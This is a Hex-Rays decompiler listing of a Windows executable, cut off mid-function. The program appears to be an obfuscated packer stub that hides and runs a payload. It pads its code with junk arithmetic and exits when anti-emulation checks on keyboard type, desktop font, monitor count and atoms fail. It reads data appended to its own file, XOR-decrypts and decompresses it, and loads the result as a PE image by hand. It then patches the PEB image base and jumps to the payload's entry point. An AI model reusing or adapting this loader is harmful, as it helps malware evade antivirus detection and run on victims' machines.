/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(int, int, int);
int __cdecl sub_4010C0(char *, int, unsigned int);
int __cdecl sub_4012A0(int *, char *);
HANDLE __cdecl sub_401320(LPCSTR lpFileName);
// int __userpurge start@<eax>(int@<ebx>, int@<edi>, int@<esi>, HMODULE, int, int);
int __cdecl sub_401C10(int);
int __stdcall sub_401E40(int);
int __cdecl sub_402440(int, int);
int __cdecl sub_402540(int);
BOOL __cdecl sub_4025B0(LPVOID lpMem);
LPVOID __cdecl sub_4025F0(SIZE_T dwBytes);
// BOOL __stdcall ImpersonateDdeClientWindow(HWND hWndClient, HWND hWndServer);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401B2C; // weak
// extern int (__stdcall *GetTextFaceA)(HDC hdc, int c, LPSTR lpName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern ATOM (__stdcall *AddAtomA)(LPCSTR lpString);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern LPVOID (__stdcall *MapViewOfFileEx)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HWND (__stdcall *GetDesktopWindow)();
// extern int (__stdcall *BroadcastSystemMessageA)(DWORD flags, LPDWORD lpInfo, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern int (__stdcall *GetSystemMetrics)(int nIndex);
// extern BOOL (__stdcall *DestroyWindow)(HWND hWnd);
// extern HACCEL (__stdcall *CreateAcceleratorTableW)(LPACCEL paccel, int cAccel);
// extern int (__stdcall *EnumPropsW)(HWND hWnd, PROPENUMPROCW lpEnumFunc);
// extern int (__stdcall *SetScrollInfo)(HWND hwnd, int nBar, LPCSCROLLINFO lpsi, BOOL redraw);
// extern BOOL (__stdcall *DestroyIcon)(HICON hIcon);
// extern BOOL (__stdcall *IsDialogMessageW)(HWND hDlg, LPMSG lpMsg);
// extern int (__stdcall *DrawTextW)(HDC hdc, LPCWSTR lpchText, int cchText, LPRECT lprc, UINT format);
// extern BOOL (__stdcall *InvalidateRect)(HWND hWnd, const RECT *lpRect, BOOL bErase);
// extern HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern ATOM (__stdcall *RegisterClassA)(const WNDCLASSA *lpWndClass);
// extern HCURSOR (__stdcall *LoadCursorA)(HINSTANCE hInstance, LPCSTR lpCursorName);
// extern HICON (__stdcall *LoadIconA)(HINSTANCE hInstance, LPCSTR lpIconName);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HDESK (__stdcall *CreateDesktopA)(LPCSTR lpszDesktop, LPCSTR lpszDevice, DEVMODEA *pDevmode, DWORD dwFlags, ACCESS_MASK dwDesiredAccess, LPSECURITY_ATTRIBUTES lpsa);
// extern int (__stdcall *GetWindowTextA)(HWND hWnd, LPSTR lpString, int nMaxCount);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern int (__stdcall *GetKeyboardType)(int nTypeFlag);
CHAR IconName[] = "eDxRtdurzFR"; // idb
char aGpwWvrodK[12] = "GPw_wvRod_K"; // weak
char aIlkokufmigwxio[31] = "IlkOkUFMiGWXIOJUUjoTFjRaJHtvxu"; // weak
CHAR WindowName[] = "PJYXbPyToNapAc"; // idb
CHAR ClassName[] = "hhQzldBcQcBZgsHvomRAnaW"; // idb
CHAR String[] = "qnJyaNqgdFpaIWIsBHHIFiTkB"; // idb
CHAR aKrvomvkin[] = "KrvOMVkIn"; // idb
int dword_404088 = 0; // weak
int dword_40408C = 0; // weak
int dword_404090 = 0; // weak
int dword_404094 = 0; // weak
int dword_404098 = 0; // weak
int dword_40409C = 0; // weak
LPCVOID lpAddress = NULL; // idb
int dword_4040A4 = 0; // weak
int dword_4040A8 = 0; // weak
int dword_4040AC = 0; // weak
int dword_4040B0 = 0; // weak
LPVOID lpMem = NULL; // idb
int dword_4040B8 = 0; // weak
int dword_4040BC = 0; // weak
int dword_4040C0 = 0; // weak
int dword_4040C4 = 0; // weak
int dword_4040C8 = 0; // weak
int (__stdcall *dword_4040CC)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_4040D0 = 0; // weak


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, int a2, int a3)
{
  HWND DesktopWindow; // eax
  HDC DC; // eax
  int result; // eax
  char Name[256]; // [esp+0h] [ebp-118h] BYREF
  int v7; // [esp+100h] [ebp-18h]
  int v8; // [esp+10Ch] [ebp-Ch]
  int i; // [esp+110h] [ebp-8h]
  int v10; // [esp+114h] [ebp-4h]

  dword_404090 = 6752319 >> (-1 - v7);
  Name[0] = 0;
  v7 *= 5856018;
  DesktopWindow = GetDesktopWindow();
  DC = GetDC(DesktopWindow);
  GetTextFaceA(DC, 255, Name);
  if ( !Name[0] )
    v7 = dword_404090;
  v7 = dword_4040B0;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    v10 = v8 + 292999;
    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2);
  }
  return result;
}
// 404090: using guessed type int dword_404090;
// 4040B0: using guessed type int dword_4040B0;
// 401000: using guessed type CHAR Name[256];

//----- (004010C0) --------------------------------------------------------
int __cdecl sub_4010C0(char *a1, int a2, unsigned int a3)
{
  int result; // eax
  int v4; // eax
  int v5; // eax
  int v6; // [esp+0h] [ebp-34h]
  int v7; // [esp+Ch] [ebp-28h] BYREF
  int v8; // [esp+10h] [ebp-24h]
  int v9; // [esp+14h] [ebp-20h]
  unsigned int i; // [esp+18h] [ebp-1Ch]
  int v11; // [esp+1Ch] [ebp-18h]
  char v12; // [esp+23h] [ebp-11h]
  int v13[2]; // [esp+24h] [ebp-10h] BYREF
  unsigned int v14; // [esp+2Ch] [ebp-8h]
  char v15; // [esp+33h] [ebp-1h]

  dword_404094 = 891723 << dword_4040B0;
  result = GetKeyboardType(0);
  if ( result > 124007797 )
  {
    dword_4040B0 = 2;
    ExitProcess(0x581u);
  }
  if ( a3 )
  {
    v12 = *a1;
    v14 = 1;
    v11 = 0;
    do
    {
      v15 = a1[v14++];
      dword_4040C0 = 560302 << (dword_4040D0 - 75);
      if ( v15 == v12 )
      {
        if ( a1[v14] )
        {
          dword_40408C = (v13[1] * 589141 * dword_4040BC) << v8;
          v4 = sub_4012A0(v13, &a1[v14]);
          v14 += v4;
          dword_4040BC = 1190 * dword_4040D0;
          v5 = sub_4012A0(&v7, &a1[v14]);
          v14 += v5;
          for ( i = 0; i < v13[0]; ++i )
          {
            dword_4040C0 = dword_4040D0 >> v6;
            *(_BYTE *)(v11 + a2) = *(_BYTE *)(a2 + v11 - v7);
            ++v11;
          }
        }
        else
        {
          *(_BYTE *)(v11 + a2) = v12;
          ++v11;
          dword_4040C0 = 169311 >> v6;
          ++v14;
        }
      }
      else
      {
        *(_BYTE *)(v11 + a2) = v15;
        ++v11;
        v6 = (v9 - dword_404098) >> (v9 + dword_4040BC);
      }
      result = v14;
    }
    while ( v14 < a3 );
  }
  return result;
}
// 40119F: variable 'v6' is possibly undefined
// 40408C: using guessed type int dword_40408C;
// 404090: using guessed type int dword_404090;
// 404094: using guessed type int dword_404094;
// 404098: using guessed type int dword_404098;
// 4040B0: using guessed type int dword_4040B0;
// 4040BC: using guessed type int dword_4040BC;
// 4040C0: using guessed type int dword_4040C0;
// 4040D0: using guessed type int dword_4040D0;

//----- (004012A0) --------------------------------------------------------
int __cdecl sub_4012A0(int *a1, char *a2)
{
  int v3; // [esp+0h] [ebp-20h]
  char v4; // [esp+8h] [ebp-18h]
  int v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+18h] [ebp-8h]

  v6 = 0;
  v3 = 0;
  do
  {
    v4 = *a2++;
    v6 = v4 & 0x7F | (v6 << 7);
    dword_4040D0 = 2 * (dword_404098 - v5);
    ++v3;
  }
  while ( (v4 & 0x80) != 0 );
  *a1 = v6;
  return v3;
}
// 4012F0: variable 'v5' is possibly undefined
// 404098: using guessed type int dword_404098;
// 4040D0: using guessed type int dword_4040D0;

//----- (00401320) --------------------------------------------------------
HANDLE __cdecl sub_401320(LPCSTR lpFileName)
{
  HANDLE FileA; // [esp+8h] [ebp-10h]

  FileA = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  dword_40408C = -dword_4040D0;
  if ( FileA == (HANDLE)-1 )
    return 0;
  else
    return FileA;
}
// 40408C: using guessed type int dword_40408C;
// 4040D0: using guessed type int dword_4040D0;

//----- (00401380) --------------------------------------------------------
int __userpurge start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, HMODULE a4, int a5, int a6)
{
  HMODULE ModuleHandleA; // eax
  HMODULE v8; // eax
  DWORD FileSize; // eax
  HWND DesktopWindow; // eax
  HDC DC; // eax
  HMODULE v12; // eax
  SIZE_T dwBytes; // [esp+Ch] [ebp-180h]
  unsigned int v14; // [esp+10h] [ebp-17Ch]
  char Name[260]; // [esp+14h] [ebp-178h] BYREF
  WNDCLASSA WndClass; // [esp+120h] [ebp-6Ch] BYREF
  HWND Window; // [esp+148h] [ebp-44h]
  LPSTR lpFilename; // [esp+14Ch] [ebp-40h]
  HMODULE v21; // [esp+150h] [ebp-3Ch]
  DWORD nNumberOfBytesToRead; // [esp+154h] [ebp-38h]
  DWORD NumberOfBytesRead; // [esp+158h] [ebp-34h] BYREF
  LPVOID lpBuffer; // [esp+15Ch] [ebp-30h]
  HMODULE hModule; // [esp+160h] [ebp-2Ch]
  int v26; // [esp+164h] [ebp-28h]
  int v27; // [esp+168h] [ebp-24h]
  int v28; // [esp+16Ch] [ebp-20h]
  HANDLE hFile; // [esp+170h] [ebp-1Ch]
  int v30; // [esp+174h] [ebp-18h]
  int v31; // [esp+178h] [ebp-14h]
  int v32; // [esp+17Ch] [ebp-10h]
  char *i; // [esp+180h] [ebp-Ch]
  int v34; // [esp+184h] [ebp-8h]
  LONG lDistanceToMove; // [esp+188h] [ebp-4h]
  int savedregs; // [esp+18Ch] [ebp+0h] BYREF

  dword_40408C = (int)CreateDesktopA;
  dword_4040D0 = dword_404098 - 482421;
  v31 = (v28 - (int)CreateDesktopA) << (8 * (64 - v32)) >> dword_4040C0;
  v34 = v28 << 21 >> 6;
  dword_404098 = v34 + dword_404098 - 482421;
  WndClass.style = 0;
  dword_4040BC <<= v31 * v31 + 109;
  WndClass.lpfnWndProc = DefWindowProcA;
  WndClass.cbClsExtra = 0;
  v28 = dword_4040C0 + 212554 * dword_4040C0 * dword_4040D0;
  WndClass.cbWndExtra = 0;
  v32 = v34 >> dword_4040D0;
  WndClass.hInstance = GetModuleHandleA(0);
  dword_404098 = (dword_40408C + dword_4040C0) << dword_404098 << 13;
  ModuleHandleA = GetModuleHandleA(0);
  WndClass.hIcon = LoadIconA(ModuleHandleA, IconName);
  dword_4040C0 = 816528 >> (dword_40408C - 93) << 11;
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  WndClass.hbrBackground = 0;
  v34 = 174407 >> v28;
  WndClass.lpszMenuName = aGpwWvrodK;
  dword_4040BC = 953338 - v31 - v31;
  WndClass.lpszClassName = aIlkokufmigwxio;
  dword_4040D0 = v28 << v28 << dword_4040C0;
  if ( !RegisterClassA(&WndClass) )
    return 0;
  if ( a5 == 1 )
  {
    dword_4040B8 = 1;
    lpAddress = a4;
  }
  else
  {
    dword_4040B8 = 0;
  }
  dword_4040C0 = 526184 - v31 * v28 - 525665;
  v8 = GetModuleHandleA(0);
  Window = CreateWindowExA(0, ClassName, WindowName, 1u, 6530, 1554, 136515, 18002, 0, 0, v8, 0);
  dword_4040BC = (int)InvalidateRect;
  if ( dword_4040B8 )
    hModule = a4;
  else
    hModule = GetModuleHandleA(0);
  dword_4040C0 = (int)ImpersonateDdeClientWindow;
  v27 <<= dword_404090;
  if ( GetKeyboardType(0) > 30599 )
  {
    dword_404094 = v27;
    ExitProcess(0x374u);
  }
  v27 = dword_4040B0;
  v21 = hModule;
  dword_40408C = (int)DrawTextW;
  v26 = (int)hModule + *((_DWORD *)hModule + 15);
  v27 = dword_4040A8 * dword_404094;
  if ( !AddAtomA(String) )
  {
    v27 *= 2167358;
    ExitProcess(0x9314u);
  }
  v27 = 6329956;
  dword_4040D0 = (int)IsDialogMessageW;
  v30 = v26 + *(unsigned __int16 *)(v26 + 20) + 24;
  v30 += 40 * (*(unsigned __int16 *)(v26 + 6) - 1);
  lDistanceToMove = *(_DWORD *)(v30 + 20)
                  + *(_DWORD *)(v26 + 60)
                  * ((unsigned int)(*(_DWORD *)(v30 + 16) + *(_DWORD *)(v26 + 60) - 1)
                   / *(_DWORD *)(v26 + 60));
  dword_4040BC = (int)DestroyIcon;
  lpFilename = (LPSTR)sub_4025F0(0x200u);
  if ( !lpFilename )
    return 0;
  dword_4040D0 = (int)SetScrollInfo;
  GetModuleFileNameA(hModule, lpFilename, 0x200u);
  v27 += 10086669;
  if ( !AddAtomA(aKrvomvkin) )
  {
    dword_4040B0 = 1694608726;
    ExitProcess(0x412544u);
  }
  v31 = 1154054400;
  hFile = sub_401320(lpFilename);
  if ( !hFile )
    return 0;
  v32 = (v34 * v31) >> dword_4040BC;
  dword_4040BC = (int)EnumPropsW;
  FileSize = GetFileSize(hFile, 0);
  nNumberOfBytesToRead = FileSize - lDistanceToMove;
  dword_40408C = (int)CreateAcceleratorTableW;
  if ( FileSize == lDistanceToMove )
    return 0;
  lpBuffer = sub_4025F0(nNumberOfBytesToRead + 16);
  if ( !lpBuffer )
    return 0;
  dword_4040D0 = v32 >> v31 >> v32;
  SetFilePointer(hFile, lDistanceToMove, 0, 0);
  if ( !ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    return 0;
  dword_4040D0 = v28 >> 4;
  CloseHandle(hFile);
  dword_4040BC = (int)DestroyWindow;
  if ( NumberOfBytesRead != nNumberOfBytesToRead )
    return 0;
  if ( !GetSystemMetrics(80) )
    ExitProcess(0x2426385u);
  dword_40408C = (int)BroadcastSystemMessageA;
  v31 += 639038 * dword_404098;
  Name[0] = 0;
  v28 = dword_404098 + v32 - dword_4040C0;
  DesktopWindow = GetDesktopWindow();
  DC = GetDC(DesktopWindow);
  GetTextFaceA(DC, 255, Name);
  if ( !Name[0] )
  {
    v34 -= dword_40408C;
    ExitProcess(0x938496u);
  }
  v31 = dword_404098 + 648620 - v32 * v32;
  sub_401000((int)lpBuffer, (int)lpBuffer + nNumberOfBytesToRead - 64, 64);
  v14 = *(_DWORD *)lpBuffer;
  dwBytes = *((_DWORD *)lpBuffer + 1);
  for ( i = 0; (unsigned int)i < v14; i += 8 )
  {
    dword_4040D0 = (419525 * dword_40408C) << v32;
    *(_DWORD *)((char *)lpBuffer + (_DWORD)i + 8) ^= 0x84746B8E;
    dword_4040BC = 466094 << (v28 + dword_404098);
  }
  lpMem = sub_4025F0(dwBytes);
  if ( !lpMem )
    ExitProcess(0x38638u);
  sub_4010C0((char *)lpBuffer + 8, (int)lpMem, v14);
  v31 = (dword_40408C + dword_404098 - 15594) >> 28;
  i = (char *)&loc_401B2C;
  dword_404098 = (dword_4040BC - 594909) >> 11;
  dword_4040C8 = (int)NtCurrentTeb();
  dword_4040D0 = (((dword_4040BC - 594909) >> 11) + 781188) << v31 >> 4;
  dword_40409C = a2;
  dword_404088 = a3;
  dword_4040AC = a1;
  v34 = 587523 >> (v34 - dword_404098);
  dword_4040A4 = (int)&savedregs;
  v34 = 186096 >> (113 * v34 - dword_4040C0);
  if ( dword_4040B8 )
  {
    sub_401C10(i - (_BYTE *)lpAddress);
  }
  else
  {
    v12 = GetModuleHandleA(0);
    sub_401C10(i - (char *)v12);
  }
  if ( !sub_401E40((int)lpMem) )
  {
    sub_4025B0(lpMem);
    ExitProcess(0x195u);
  }
  dword_4040BC = v34 << ((v31 << (v28 + 73)) - dword_4040BC);
  dword_404098 = (701812 * (v31 << (v28 + 73) << dword_4040C0 >> 11)) << v34 >> v34;
  return dword_4040CC(a4, a5, a6);
}
// 404088: using guessed type int dword_404088;
// 40408C: using guessed type int dword_40408C;
// 404090: using guessed type int dword_404090;
// 404094: using guessed type int dword_404094;
// 404098: using guessed type int dword_404098;
// 40409C: using guessed type int dword_40409C;
// 4040A4: using guessed type int dword_4040A4;
// 4040A8: using guessed type int dword_4040A8;
// 4040AC: using guessed type int dword_4040AC;
// 4040B0: using guessed type int dword_4040B0;
// 4040B8: using guessed type int dword_4040B8;
// 4040BC: using guessed type int dword_4040BC;
// 4040C0: using guessed type int dword_4040C0;
// 4040C8: using guessed type int dword_4040C8;
// 4040CC: using guessed type int (__stdcall *dword_4040CC)(_DWORD, _DWORD, _DWORD);
// 4040D0: using guessed type int dword_4040D0;
// 401380: using guessed type CHAR Name[260];

//----- (00401C10) --------------------------------------------------------
int __cdecl sub_401C10(int a1)
{
  HMODULE ModuleHandleA; // [esp+4h] [ebp-30h]
  _DWORD *v3; // [esp+8h] [ebp-2Ch]
  int v4; // [esp+Ch] [ebp-28h]
  SIZE_T *v5; // [esp+10h] [ebp-24h]
  unsigned int v6; // [esp+14h] [ebp-20h]
  _DWORD *i; // [esp+28h] [ebp-Ch]
  unsigned int j; // [esp+2Ch] [ebp-8h]

  if ( dword_4040B8 )
    ModuleHandleA = (HMODULE)lpAddress;
  else
    ModuleHandleA = GetModuleHandleA(0);
  if ( !ModuleHandleA )
    return 0;
  v5 = (SIZE_T *)((char *)ModuleHandleA + *((_DWORD *)ModuleHandleA + 15));
  dword_4040C4 = (int)VirtualAlloc(0, v5[20], 0x3000u, 0x40u);
  if ( dword_4040C4 )
  {
    sub_401000(dword_4040C4, (int)ModuleHandleA, v5[20]);
    v4 = dword_4040C4 - (_DWORD)ModuleHandleA;
    if ( v5[41] )
    {
      for ( i = (_DWORD *)((char *)ModuleHandleA + v5[40]); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v6 = (unsigned int)(i[1] - 8) >> 1;
        v3 = i + 2;
        dword_40408C = dword_4040D0 >> 31;
        for ( j = 0; j < v6; ++j )
        {
          dword_4040BC = 166259 >> dword_404098;
          if ( (int)*((unsigned __int16 *)v3 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4040C4 + (*((_WORD *)v3 + j) & 0xFFF)) += v4;
        }
      }
    }
    __asm { jmp     eax }
  }
  return 0;
}
// 40408C: using guessed type int dword_40408C;
// 404098: using guessed type int dword_404098;
// 4040B8: using guessed type int dword_4040B8;
// 4040BC: using guessed type int dword_4040BC;
// 4040C4: using guessed type int dword_4040C4;
// 4040D0: using guessed type int dword_4040D0;

//----- (00401E40) --------------------------------------------------------
int __stdcall sub_401E40(int a1)
{
  const CHAR *j; // [esp+4h] [ebp-58h]
  _DWORD *v3; // [esp+Ch] [ebp-50h]
  char *v4; // [esp+10h] [ebp-4Ch]
  int v5; // [esp+14h] [ebp-48h]
  char *v6; // [esp+14h] [ebp-48h]
  int v7; // [esp+18h] [ebp-44h]
  int *v8; // [esp+1Ch] [ebp-40h]
  const CHAR *v9; // [esp+20h] [ebp-3Ch]
  unsigned int v10; // [esp+24h] [ebp-38h]
  int v11; // [esp+2Ch] [ebp-30h]
  _DWORD *v12; // [esp+30h] [ebp-2Ch]
  int *v13; // [esp+34h] [ebp-28h]
  int v14; // [esp+3Ch] [ebp-20h]
  const CHAR *k; // [esp+40h] [ebp-1Ch]
  HMODULE hModule; // [esp+44h] [ebp-18h]
  int v17; // [esp+48h] [ebp-14h]
  int v18; // [esp+4Ch] [ebp-10h]
  unsigned int i; // [esp+50h] [ebp-Ch]
  unsigned int m; // [esp+50h] [ebp-Ch]
  HANDLE hFileMappingObject; // [esp+54h] [ebp-8h]
  int v22; // [esp+58h] [ebp-4h]

  v5 = *(_DWORD *)(a1 + 60) + a1;
  v12 = (_DWORD *)(v5 + *(unsigned __int16 *)(v5 + 20) + 24);
  v9 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v5 + 80), 0x3000u, 0x40u);
  if ( !v9 )
    return 0;
  dword_4040D0 = v7 - v18 + 735473;
  sub_401000((int)v9, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v5 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v5 + 6); ++i )
  {
    v14 = (142883 * v7) << dword_4040BC;
    if ( v12[5] )
    {
      if ( v12[4] )
        sub_401000(
          (int)&v9[v12[3]],
          v12[5] + a1,
          *(_DWORD *)(v5 + 60) * ((unsigned int)(v12[4] + *(_DWORD *)(v5 + 60) - 1) / *(_DWORD *)(v5 + 60)));
    }
    dword_40408C = v22 << 9;
    v12 += 10;
  }
  v6 = (char *)&v9[*((_DWORD *)v9 + 15)];
  for ( j = &v9[*((_DWORD *)v6 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = GetModuleHandleA(&v9[*((_DWORD *)j + 3)]);
    if ( !hModule )
    {
      if ( dword_4040B8 )
        return 0;
      hModule = LoadLibraryA(&v9[*((_DWORD *)j + 3)]);
      dword_4040BC = 0;
      if ( !hModule )
        return 0;
    }
    dword_4040D0 = 0;
    if ( *(_DWORD *)j )
    {
      v13 = (int *)&v9[*(_DWORD *)j];
      v8 = (int *)&v9[*((_DWORD *)j + 4)];
    }
    else
    {
      v13 = (int *)&v9[*((_DWORD *)j + 4)];
      v8 = (int *)&v9[*(_DWORD *)j];
    }
    v17 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v17 = 1;
    while ( *v13 )
    {
      v14 += dword_40408C + 882965;
      if ( *v13 >= 0 )
        *v13 = (int)GetProcAddress(hModule, &v9[*v13 + 2]);
      else
        *v13 = (int)GetProcAddress(hModule, (LPCSTR)(*v13 & 0x7FFFFFFF));
      if ( !*v13 )
        return 0;
      if ( v17 )
        *v8 = *v13;
      ++v13;
      ++v8;
    }
  }
  if ( dword_4040B8 )
  {
    v4 = (char *)lpAddress - *((_DWORD *)v6 + 13);
    if ( *((_DWORD *)v6 + 41) )
    {
      for ( k = &v9[*((_DWORD *)v6 + 40)]; *((_DWORD *)k + 1); k += *((_DWORD *)k + 1) )
      {
        v10 = (unsigned int)(*((_DWORD *)k + 1) - 8) >> 1;
        v3 = k + 8;
        for ( m = 0; m < v10; ++m )
        {
          dword_40408C = dword_4040C0 * v11;
          if ( (int)*((unsigned __int16 *)v3 + m) >> 12 == 3 )
            *(_DWORD *)&v9[*(_DWORD *)k + (*((_WORD *)v3 + m) & 0xFFF)] += v4;
        }
      }
    }
  }
  hFileMappingObject = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, *((_DWORD *)v6 + 20), 0);
  if ( !hFileMappingObject )
    return 0;
  dword_404098 = 857055 >> dword_404098;
  if ( dword_4040B8 )
    dword_4040C4 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress);
  else
    dword_4040C4 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v6 + 13));
  if ( dword_4040C4 )
    goto LABEL_66;
  dword_404098 = dword_4040BC * v11;
  if ( dword_4040B8 )
  {
    if ( !UnmapViewOfFile(lpAddress) && !VirtualFree((LPVOID)lpAddress, 0, 0x8000u) )
      return 0;
  }
  else if ( !UnmapViewOfFile(*((LPCVOID *)v6 + 13)) && !VirtualFree(*((LPVOID *)v6 + 13), 0, 0x8000u) )
  {
    return 0;
  }
  dword_4040C4 = (int)(dword_4040B8 ? MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress) : MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v6 + 13)));
  if ( !dword_4040C4 )
  {
    dword_4040C4 = (int)(dword_4040B8 ? VirtualAlloc((LPVOID)lpAddress, *((_DWORD *)v6 + 20), 0x3000u, 0x40u) : VirtualAlloc(*((LPVOID *)v6 + 13), *((_DWORD *)v6 + 20), 0x3000u, 0x40u));
    if ( !dword_4040C4 )
      return 0;
  }
LABEL_66:
  dword_4040C0 = dword_4040BC >> 24;
  sub_401000(dword_4040C4, (int)v9, *((_DWORD *)v6 + 20));
  if ( dword_4040B8 )
    sub_402440((int)lpAddress, *((_DWORD *)v6 + 10) + dword_4040C4);
  else
    sub_402540(dword_4040C4);
  dword_4040CC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))(*((_DWORD *)v6 + 10) + dword_4040C4);
  *((_DWORD *)v6 + 10) = dword_4040CC;
  dword_4040C0 = v18 + dword_4040BC + 618225;
  return 1;
}
// 401E93: variable 'v7' is possibly undefined
// 401E93: variable 'v18' is possibly undefined
// 401F4E: variable 'v22' is possibly undefined
// 40205B: variable 'v14' is possibly undefined
// 402172: variable 'v11' is possibly undefined
// 40408C: using guessed type int dword_40408C;
// 404098: using guessed type int dword_404098;
// 4040B8: using guessed type int dword_4040B8;
// 4040BC: using guessed type int dword_4040BC;
// 4040C0: using guessed type int dword_4040C0;
// 4040C4: using guessed type int dword_4040C4;
// 4040CC: using guessed type int (__stdcall *dword_4040CC)(_DWORD, _DWORD, _DWORD);
// 4040D0: using guessed type int dword_4040D0;

//----- (00402440) --------------------------------------------------------
int __cdecl sub_402440(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-28h]
  _DWORD *v4; // [esp+10h] [ebp-18h]
  _DWORD *v5; // [esp+20h] [ebp-8h]
  char v6; // [esp+24h] [ebp-4h]

  v3 = *(_DWORD *)(*(_DWORD *)(dword_4040C8 + 48) + 12);
  dword_4040BC = 604095 * dword_4040D0;
  v4 = *(_DWORD **)(v3 + 12);
  v5 = v4;
  dword_4040D0 = 104064 << v6;
  do
  {
    if ( !v4 )
      return 0;
    if ( v4[6] == a1 )
    {
      v4[7] = a2;
      return 1;
    }
    v4 = (_DWORD *)*v4;
  }
  while ( v4 != v5 );
  return 0;
}
// 402499: variable 'v6' is possibly undefined
// 40408C: using guessed type int dword_40408C;
// 404098: using guessed type int dword_404098;
// 4040BC: using guessed type int dword_4040BC;
// 4040C8: using guessed type int dword_4040C8;
// 4040D0: using guessed type int dword_4040D0;

//----- (00402540) --------------------------------------------------------
int __cdecl sub_402540(int a1)
{
  int result; // eax
  int v2; // [esp+Ch] [ebp-4h]

  dword_40408C = v2 + 466522 * dword_404098;
  result = *(_DWORD *)(dword_4040C8 + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 402554: variable 'v2' is possibly undefined
// 40408C: using guessed type int dword_40408C;
// 404098: using guessed type int dword_404098;
// 4040C8: using guessed type int dword_4040C8;
// 4040D0: using guessed type int dword_4040D0;

//----- (004025B0) --------------------------------------------------------
BOOL __cdecl sub_4025B0(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax
  char v3; // [esp+8h] [ebp-Ch]

  dword_404098 = dword_40408C << v3;
  ProcessHeap = GetProcessHeap();
  return HeapFree(ProcessHeap, 0, lpMem);
}
// 4025C7: variable 'v3' is possibly undefined
// 40408C: using guessed type int dword_40408C;
// 404098: using guessed type int dword_404098;

//----- (004025F0) --------------------------------------------------------
LPVOID __cdecl sub_4025F0(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax
  LPVOID result; // eax
  char String[260]; // [esp+0h] [ebp-128h] BYREF
  HWND hWnd; // [esp+104h] [ebp-24h]
  int v5; // [esp+108h] [ebp-20h]
  int v6; // [esp+10Ch] [ebp-1Ch]
